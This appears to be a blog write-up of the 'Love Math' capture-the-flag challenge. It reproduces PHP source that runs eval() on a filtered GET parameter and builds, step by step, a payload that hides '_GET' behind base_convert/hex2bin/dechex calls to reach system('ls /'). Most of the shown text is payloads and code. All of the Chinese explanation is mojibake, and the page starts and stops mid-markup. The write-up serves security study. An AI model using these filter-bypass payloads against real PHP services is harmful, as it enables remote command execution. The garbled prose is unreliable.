class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-comment">//issetå‡½æ•°ç”¨äºåˆ¤æ–­è¯¥å˜é‡æ˜¯å¦ä¸ºnull,å¦‚æœä¸ºnullè¿”å›flase</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-comment">//å°†GETæ–¹æ³•è·å–çš„å†…å®¹ä¼ è¾“ç»™å˜é‡content</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-comment">//åˆ¤æ–­è¾“å…¥çš„å†…å®¹é•¿åº¦æ˜¯å¦&gt;=80</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//è®¾ç½®é»‘åå•æ•°æ®:ç©ºæ ¼,\t,\r,&#x27;,&quot;,`,[,]</span><br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<span class="hljs-comment">//éå†é»‘åå•æ•°æ®</span><br>        <span class="hljs-comment">//æ­£åˆ™è¡¨è¾¾å¼/mè¡¨ç¤ºå¤šè¡ŒåŒ¹é…</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-comment">//è®¾ç½®å¯ä»¥è¢«å…è®¸ä½¿ç”¨çš„å‡½æ•°åå•</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-comment">//$used_funcsç”¨äºå­˜å‚¨åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span><br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>); <br>    <span class="hljs-comment">//$used_funcs[0]:è¡¨ç¤ºæ•°ç»„used_funcsçš„èµ·å§‹åœ°å€ï¼Œä½¿funcä»æ•°ç»„ç¬¬ä¸€ä¸ªå¼€å§‹å–ï¼Œç›´åˆ°æœ€åä¸€ä¸ª </span><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<span class="hljs-comment">//éå†åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-comment">//åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²å¦‚æœä¸å­˜åœ¨äºç™½åå•ä¸­</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//æœ‰å±é™©å‡½æ•°æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡$content=system(&quot;ls /&quot;)æ‰§è¡Œæ¶æ„ä»£ç </span><br>&#125; <br></code></pre></td></tr></table></figure><p>å‡½æ•°ä»‹ç»:<br><strong>issert:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç”¨äºåˆ¤æ–­å˜é‡çš„å†…å®¹æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºnull,åˆ™è¿”å›false<br></code></pre></td></tr></table></figure><p><strong>show_source(filename,return)</strong>:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs txt">show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œ PHP è¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚è¯­æ³•é€šè¿‡ä½¿ç”¨ HTML æ ‡ç­¾è¿›è¡Œé«˜äº®ã€‚<br><br>ç”¨äºé«˜äº®çš„é¢œè‰²å¯é€šè¿‡ php.ini æ–‡ä»¶è¿›è¡Œè®¾ç½®æˆ–è€…é€šè¿‡è°ƒç”¨ ini_set() å‡½æ•°è¿›è¡Œè®¾ç½®ã€‚<br><br>show_source() æ˜¯ highlight_file() çš„åˆ«åã€‚<br><br>æ³¨é‡Šï¼šå½“ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œæ•´ä¸ªæ–‡ä»¶éƒ½å°†è¢«æ˜¾ç¤ºï¼ŒåŒ…æ‹¬å¯†ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯ï¼<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824101642383.png" alt="image-20230824101642383"></p><p><strong>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] ):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824102848164.png" alt="image-20230824102848164"></p><p><strong>in_array(search,array,type)</strong></p><p><img src="/images/2023-8-24_LoveMath/image-20230824104747383.png" alt="image-20230824104747383"></p><p>3.åˆ†æ:<br><strong>ç”±äºæˆ‘ä»¬éœ€è¦åˆ©ç”¨æœ€åeval()å‡½æ•°æ‰§è¡Œæ¶æ„ä»£ç ï¼Œæ‰€ä»¥æœ€åcontentçš„å€¼åº”è¯¥ä¸º:</strong><br><strong>system(â€œls &#x2F;â€œ)</strong></p><p>æµ‹è¯•ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(&quot;dir&quot;)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//å‘ç”Ÿå‡½æ•°æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824105712830.png" alt="image-20230824105712830"></p><p>è€Œcontentçš„å€¼åˆæ˜¯GET(â€˜câ€™)è¿›è¡Œè·å–</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=system(&quot;ls /&quot;)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824105855231.png" alt="image-20230824105855231"></p><p>è¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä¸­å«æœ‰é»‘åå•å­—ç¬¦:â€,ç©ºæ ¼</p><p><strong>åœ¨PHPä»£ç ä¸­æ²¡æœ‰â€â€å‘½ä»¤ä¾ç„¶å¯ä»¥è¢«æ‰§è¡Œ:</strong><br>æµ‹è¯•:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;system(dir)&#x27;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//å‘ç”Ÿå‡½æ•°æ‰§è¡Œ</span><br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824110120472.png" alt="image-20230824110120472"></p><p><strong>ç”±äºeval()å¯ä»¥æ‰§è¡Œæ­£ç¡®è¯­æ³•çš„PHPä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨eval()ä¸­æ„é€ ä¸€ä¸ªPHPä»£ç ,å³ç”¨å˜é‡ä¿å­˜å‡½æ•°å’Œå‚æ•°:</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">eval(echo $_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]));<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åæ„é€ çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p><strong>GET()å‡½æ•°ä¸­ä¹Ÿå¯ä»¥ä¸éœ€è¦å•å¼•å·â€™â€™,å¹¶ä¸”[]å¯ä»¥ä½¿ç”¨{}ä»£æ›¿</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir <br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><p><img src="/images/2023-8-24_LoveMath/image-20230824130556447.png" alt="image-20230824130556447"></p><p>åœ¨é¢˜ç›®çš„ç½‘é¡µä¸­è¾“å…¥åæ˜¾ç¤º:<br>![image-20230824130738728](images&#x2F;2023-8-24_Love Math&#x2F;image-20230824130738728.png)</p><p>è¿™æ—¶å·²ç»ç»•è¿‡ç¬¬ä¸€å±‚åˆ¤æ–­ï¼Œæ¥åˆ°ç¬¬äºŒå±‚åˆ¤æ–­:</p><p>4.å¯¹ç¬¬äºŒå±‚åˆ¤æ–­è¿›è¡Œç»•è¿‡:</p><p><strong>å‡½æ•°ä»‹ç»:</strong><br><strong>base_convert()å‡½æ•°(å±äºæ•°å­¦å‡½æ•°):</strong><br><img src="/images/2023-8-24_LoveMath/image-20230824131254523.png" alt="image-20230824131254523"></p><h5 id="hex2bin-String-å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰"><a href="#hex2bin-String-å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰" class="headerlink" title="hex2bin(String) å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰:"></a><strong>hex2bin(String) å‡½æ•°ï¼ˆå±äºå­—ç¬¦ä¸²å‡½æ•°ï¼‰:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131526831.png" alt="image-20230824131526831"></p><h5 id="dechex-å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰"><a href="#dechex-å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰" class="headerlink" title="dechex() å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰:"></a><strong>dechex() å‡½æ•°ï¼ˆå±äºæ•°å­¦å‡½æ•°ï¼‰:</strong></h5><p><img src="/images/2023-8-24_LoveMath/image-20230824131746347.png" alt="image-20230824131746347"></p><p>ç°åœ¨çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;a&#125;($_GET&#123;b&#125;)&amp;a=system&amp;b=ls /<br></code></pre></td></tr></table></figure><p>ç”±äºå‡½æ•°:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);<br></code></pre></td></tr></table></figure><p>å¯¹è¯¥æ­£åˆ™è¡¨è¾¾å¼çš„è§£é‡Š:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs txt">[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*:<br>è¡¨ç¤ºç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä»¥a-zæˆ–A-Zæˆ–_æˆ–ä¸å¯è§å­—ç¬¦ä¸­çš„ä¸€ä¸ªï¼Œç¬¬äºŒä¸ªå­—ç¬¦æ˜¯a-zæˆ–A-Zæˆ–_æˆ–æ•°å­—æˆ–ä¸å¯è§å­—ç¬¦ä¸­çš„ä¸€ä¸ª<br>ä¸”ç¬¬äºŒä¸ªå­—ç¬¦çš„æƒ…å†µå¯ä»¥å‡ºç°0æ¬¡æˆ–å¤šæ¬¡(ç¬¦åˆPHPå¯¹å˜é‡åçš„è¦æ±‚):<br>å®ä¾‹:<br>a9oo9<br>Aa99o<br>_GET<br>ä¸å¯è§å­—ç¬¦9oooa<br><br>æ‰€ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä¸ä¼šè¢«åŒ¹é…<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æå–çš„æ˜¯contentå­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„å•è¯ï¼Œæ‰€ä»¥æœ€ç»ˆcontentä¼šè¢«æå–æˆ:GET,a,b</p><p><strong>è¿™äº›å•è¯éƒ½ä¸åŒ…å«åœ¨ç™½åå•ä¸­ï¼Œæ‰€ä»¥è¦å°†è¿™äº›å•è¯è¿›è¡Œæ›¿æ¢(å†…éƒ¨å‡½æ•°åå¯ä»¥è¢«ç”¨ä½œæ˜¯å‚æ•°å)a&#x3D;&gt;abs,b&#x3D;&gt;atan,GETç”±äºæ˜¯è¦å‡½æ•°æ‰§è¡Œï¼Œæ‰€ä»¥æ— æ³•è¢«æ›¿æ¢:</strong><br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°å­¦å‡½æ•°å¯¹$_GETè¿›è¡Œè½¬ç </p><p><strong>36è¿›åˆ¶ä»‹ç»(åŒç†17-35è¿›åˆ¶ï¼Œå°±æ˜¯å°‘äº†ä¸€äº›å­—æ¯):</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä¸‰åå…­è¿›åˆ¶ï¼Œæ˜¯æ•°æ®çš„ä¸€ç§è¡¨ç¤ºæ–¹æ³•ã€‚åŒæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„è¡¨ç¤ºæ³•ä¸ä¸€æ ·ã€‚å®ƒç”±0-9ï¼ŒA-Zç»„æˆï¼Œå­—æ¯ä¸åŒºåˆ†å¤§å°å†™ã€‚ä¸10è¿›åˆ¶çš„å¯¹åº”å…³ç³»æ˜¯ï¼š0-9å¯¹åº”0-9ï¼›A-Zå¯¹åº”10-35<br></code></pre></td></tr></table></figure><p>å®ä¾‹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">//35=&gt;z<br>print(base_convert(35,10,36).&quot;\n&quot;);<br><br>//37=36+1=&gt;36^1*1+36^0*1=&gt;11<br>print(base_convert(37,10,36).&quot;\n&quot;);<br><br>//9=&gt;9<br>print(base_convert(9,10,36).&quot;\n&quot;);<br><br>//70=&gt;36+34=&gt;36^1*1+36^0*34=&gt;1y<br>print(base_convert(70,10,36).&quot;\n&quot;);<br><br>è¾“å‡º:<br>z<br>11<br>9<br>1y<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å‘ç°é€šè¿‡åè¿›åˆ¶è½¬36è¿›åˆ¶å¯ä»¥è¢«0-9å’Œa-zçš„å­—ç¬¦è¿›è¡Œè¡¨ç¤ºè¾“å‡º36è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹å®šçš„åè¿›åˆ¶å€¼ä½¿å…¶è¢«è½¬åŒ–ä¸º36è¿›åˆ¶æ—¶åˆšå¥½æ˜¯å­—ç¬¦ä¸²å‡½æ•°hex2bin:</p><p>å°†36è¿›åˆ¶(36è¿›åˆ¶åŒ…å«æ‰€æœ‰éç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥ç”¨äºè¡¨ç¤ºæ‰€æœ‰ä¸å«ç‰¹æ®Šå­—ç¬¦çš„å‡½æ•°)hex2binè½¬åŒ–ä¸º10è¿›åˆ¶:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;hex2bin&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//37907361743</span><br></code></pre></td></tr></table></figure><p>ç”±äº$_GETå‡½æ•°å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥å¿…é¡»ä½¿ç”¨hex2binå°†16è¿›åˆ¶è½¬åŒ–ä¸ºASCIIç çš„å½¢å¼è¿›è¡Œä»£æ¢</p><p><strong>å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸º16è¿›åˆ¶:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py">s = <span class="hljs-string">&quot;_GET&quot;</span><br>s_hex = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    s_hex = s_hex+<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(s[i]))[<span class="hljs-number">2</span>:]+<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-built_in">print</span>(s_hex)<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5f 47 45 54 <br></code></pre></td></tr></table></figure><p>å‘ç°16è¿›åˆ¶è¡¨ç¤ºä¸­å«æœ‰å­—æ¯ï¼Œæ‰€ä»¥ä¼šè¢«preg_match_all()å‡½æ•°æå–ï¼Œæ‰€ä»¥è¦å°†è¯¥16è¿›åˆ¶è½¬åŒ–ä¸º10è¿›åˆ¶ï¼Œå†ç”±dechex() å°†10è¿›åˆ¶è½¬å›ç»™16è¿›åˆ¶</p><p><strong>16è¿›åˆ¶è½¬10è¿›åˆ¶ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">print</span>(<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;5f474554&quot;</span>,<span class="hljs-number">16</span>,<span class="hljs-number">10</span>).<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//1598506324</span><br></code></pre></td></tr></table></figure><p>_GETçš„payloadçš„æ„é€ :</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">_GET=hex2bin(&quot;5f474554&quot;)<br>hex2bin=base_convert(&quot;37907361743&quot;,10,36)()<br>&quot;5f474554&quot;=dechex(&quot;1598506324&quot;)<br>_GET=base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;))<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥$_GET{}:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;&#125;<br></code></pre></td></tr></table></figure><p>5.æ„é€ payload</p><p>åŸæ¥çš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$_GET&#123;abs&#125;($_GET&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p>è½¬æ¢payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;abs&#125;($(base_convert(&quot;37907361743&quot;,10,36)(dechex(&quot;1598506324&quot;)))&#123;atan&#125;)&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824143815219.png" alt="image-20230824143815219"></p><p>ç”±äºcçš„é•¿åº¦å¤ªé•¿æ‰€ä»¥å¿…é¡»ç®€åŒ–payload</p><p>æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;a&#125;(<span class="hljs-variable">$base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span 